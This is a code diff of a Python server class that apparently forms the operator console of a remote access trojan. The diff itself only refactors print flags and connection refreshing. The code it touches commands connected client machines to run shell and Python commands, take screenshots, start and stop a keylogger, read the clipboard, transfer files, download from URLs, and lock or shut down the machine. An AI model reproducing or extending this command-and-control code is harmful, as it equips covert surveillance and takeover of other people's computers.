@@ -213,7 +213,7 @@ class MultiServer(object):
         target = self.all_connections.index(conn)
         return self.all_keys[target]
 
-    def receive(self, conn, _print=True) -> bytes:
+    def receive(self, conn, _print=False) -> bytes:
         """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
         KEY = self.get_key(conn)
 
@@ -233,7 +233,7 @@ class MultiServer(object):
         conn.recv(1024)
         conn.send(encrypted)
 
-    def accept_connections(self, _print=True) -> None:
+    def accept_connections(self, _print=False) -> None:
         """ Accepts incoming connections and agrees on a AES key using RSA"""
         while 1:
             try:
@@ -284,7 +284,7 @@ class MultiServer(object):
                 self.all_connections.append(conn)
                 logging.debug('Fernet Key: {}'.format(str(Decrypted)))
 
-                client_hostname = self.receive(conn, _print=False).decode()
+                client_hostname = self.receive(conn).decode()
 
                 address = address + (client_hostname,)
                 self.all_addresses.append(address)
@@ -299,11 +299,10 @@ class MultiServer(object):
                 del publicKey
                 logging.debug(errors(e))
 
-    def list_connections(self, _print=True) -> None:
-        """ List all connections """
+    def refresh_connections(self) -> None:
+        """ Refreshes connections """
         connections = self.all_connections[:]
-        # Verifies connections
-        for i, conn in enumerate(connections):
+        for conn in connections:
             try:
                 self.send(conn, json_dumps(['LIST']))
                 conn.recv(20480)
@@ -312,12 +311,14 @@ class MultiServer(object):
                 del self.all_connections[target]
                 del self.all_addresses[target]
                 del self.all_keys[target]
-                continue
-        if _print:
-            # Print Clients
-            print('----- Clients -----')
-            for i, conn in enumerate(self.all_connections):
-                print(str(i) + '   ' + '   '.join(map(str, self.all_addresses[i])))
+                conn.close()
+
+    def list_connections(self) -> None:
+        """ List all connections """
+        self.refresh_connections()
+        print('----- Clients -----')
+        for i, address in enumerate(self.all_addresses):
+            print(str(i) + '   ' + '   '.join(map(str, address)))
         return
 
     def get_target(self, cmd) -> socket.socket:
@@ -342,13 +343,13 @@ class MultiServer(object):
         """ Send file from Server to Client """
         # returns None
         self.send(conn, json_dumps(['SEND_FILE', save_as]))
-        self.receive(conn, _print=False)
+        self.receive(conn)
         for line in read_file(file_to_transfer):
             self.send(conn, line)
-            self.receive(conn, _print=False)
+            self.receive(conn)
 
         self.send(conn, b'FILE_TRANSFER_DONE')
-        self.receive(conn)
+        self.receive(conn, _print=True)
 
     def receive_file(self, conn, file_to_transfer, save_as) -> None:
         """ Transfer file from Client to Server """
@@ -356,27 +357,27 @@ class MultiServer(object):
         self.send(conn, json_dumps(['RECEIVE_FILE', file_to_transfer]))
         with open(save_as, 'wb') as f:
             while 1:
-                data = self.receive(conn, _print=False)
+                data = self.receive(conn)
                 if data == b'FILE_TRANSFER_DONE':
                     self.send(conn, b'RECEIVED')
                     break
                 f.write(data)
                 self.send(conn, b'RECEIVED')
-        self.receive(conn)
+        self.receive(conn, _print=True)
 
     def _get_log(self, conn) -> str:
         """ Get Log File Name"""
         self.send(conn, json_dumps(['LOG_FILE']))
-        return self.receive(conn, _print=False).decode()
+        return self.receive(conn).decode()
 
     def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))) -> (bool, str):
         """ Take screenshot on Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['SCREENSHOT']))
-        data = self.receive(conn, _print=False).decode()
+        data = self.receive(conn).decode()
         if data == 'ERROR':
             self.send(conn, b'RECEIVING')
-            return False, self.receive(conn, _print=False)
+            return False, self.receive(conn)
         self.receive_file(conn, data, save_as)
         return True, save_as
 
@@ -384,7 +385,7 @@ class MultiServer(object):
         """ Remote Python Interpreter """
         # returns command_output, error/None
         self.send(conn, json_dumps(['EXEC', command]))
-        data = json_loads(self.receive(conn, _print=False))
+        data = json_loads(self.receive(conn))
         return data[0], data[1]
 
     def python_interpreter(self, conn) -> None:
@@ -408,7 +409,7 @@ class MultiServer(object):
         system = self.get_platform(conn)
         if command.lower().strip() == 'cd':
             self.send(conn, json_dumps(['SHELL', command]))
-            output = self.receive(conn, _print=False).decode()
+            output = self.receive(conn).decode()
             if system == 'Windows':
                 result = output + '\n'
                 if _print:
@@ -419,7 +420,7 @@ class MultiServer(object):
             return output, output
         if command[:2].lower().strip() == 'cd' or command[:5].lower().strip() == 'chdir':
             self.send(conn, json_dumps(['SHELL', command]))
-            cwd = json.loads(self.receive(conn, _print=False).decode())
+            cwd = json.loads(self.receive(conn).decode())
             if cwd[0] == 'ERROR':
                 if _print:
                     print(cwd[1])
@@ -435,7 +436,7 @@ class MultiServer(object):
         self.send(conn, json_dumps(['SHELL', command]))
         result = []
         while 1:
-            output = self.receive(conn, _print=False)
+            output = self.receive(conn)
             if output == b'DONE':
                 break
             result.append(output)
@@ -451,7 +452,7 @@ class MultiServer(object):
         """ Clear Screen """
         if conn != None:
             self.send(conn, json_dumps(['CLEAR']))
-            self.receive(conn, _print=False)
+            self.receive(conn)
         if _print:
             if platform.system() == 'Windows':
                 _ = os.system('cls')
@@ -463,31 +464,31 @@ class MultiServer(object):
         """ Get Client Platform """
         # platform.system()
         self.send(conn, json_dumps(['PLATFORM']))
-        return self.receive(conn, _print=False).decode()
+        return self.receive(conn).decode()
 
     def get_cwd(self, conn) -> str:
         """ Get Client cwd """
         # returns cwd
         self.send(conn, json_dumps(['GETCWD']))
-        return self.receive(conn, _print=False).decode()
+        return self.receive(conn).decode()
 
     def start_keylogger(self, conn) -> bool:
         """ Start Keylogger """
         # returns True/False
         self.send(conn, json_dumps(['START_KEYLOGGER']))
-        return json_loads(self.receive(conn, _print=False))[0]
+        return json_loads(self.receive(conn))[0]
 
     def keylogger_status(self, conn) -> bool:
         """ Get Keylogger Status """
         # returns True/False
         self.send(conn, json_dumps(['KEYLOGGER_STATUS']))
-        return json_loads(self.receive(conn, _print=False))[0]
+        return json_loads(self.receive(conn))[0]
 
     def stop_keylogger(self, conn) -> bool:
         """ Stop Keylogger """
         # returns True/False
         self.send(conn, json_dumps(['STOP_KEYLOGGER']))
-        return json_loads(self.receive(conn, _print=False))[0]
+        return json_loads(self.receive(conn))[0]
 
     def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))) -> str:
         """ Transfer log to Server """
@@ -506,7 +507,7 @@ class MultiServer(object):
         # data[0]: True/False
         # data[1]: None/error
         self.send(conn, json_dumps(['COPY', data]))
-        data = json_loads(self.receive(conn, _print=False))
+        data = json_loads(self.receive(conn))
         return data[0], data[1]
 
     def get_clipboard(self, conn, _print=False) -> (bool, str):
@@ -514,7 +515,7 @@ class MultiServer(object):
         # data[0]: True/False
         # data[1]: clipboard/error
         self.send(conn, json_dumps(['PASTE']))
-        data = json_loads(self.receive(conn, _print=False))
+        data = json_loads(self.receive(conn))
         if _print and data[0]:
             print(data[1])
         return data[0], data[1]
@@ -529,47 +530,47 @@ class MultiServer(object):
         # ]
 
         self.send(conn, json_dumps(['_INFO']))
-        return json_loads(self.receive(conn, _print=False))
+        return json_loads(self.receive(conn))
 
     def download(self, conn, url, file_name) -> (bool, str):
         """ Download File To Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['DOWNLOAD', url, file_name]))
-        data = json_loads(self.receive(conn, _print=False))
+        data = json_loads(self.receive(conn))
         return data[0], data[1]
 
     def restart_session(self, conn) -> bool:
         """ Restart Client Session """
         # returns True
         self.send(conn, json_dumps(['RESTART_SESSION']))
-        self.receive(conn, _print=False)
-        self.list_connections(_print=False)
+        self.receive(conn)
+        self.refresh_connections()
         return True
 
     def disconnect(self, conn) -> bool:
         """ Disconnect Client """
         # returns True
         self.send(conn, json_dumps(['DISCONNECT']))
-        self.receive(conn, _print=False)
+        self.receive(conn)
         conn.close()
-        self.list_connections(_print=False)
+        self.refresh_connections()
         return True
 
     def lock(self, conn) -> bool:
         """ Lock Client Machine (Windows Only) """
         self.send(conn, json_dumps(['LOCK']))
-        return self.receive(conn, _print=False)
+        return self.receive(conn)
 
     def shutdown(self, conn) -> None:
         """ Shutdown Client Machine """
         self.send(conn, json_dumps(['SHUTDOWN']))
-        self.list_connections(_print=False)
+        self.refresh_connections()
         return
 
     def restart(self, conn) -> None:
         """ Restart Client Machine """
         self.send(conn, json_dumps(['RESTART']))
-        self.list_connections(_print=False)
+        self.refresh_connections()
         return
 
     def shell(self, conn) -> None:
@@ -767,7 +768,7 @@ class MultiServer(object):
 def accept_conns(server) -> None:
     server.socket_create()
     server.socket_bind()
-    server.accept_connections()
+    server.accept_connections(_print=True)
     return
 
 
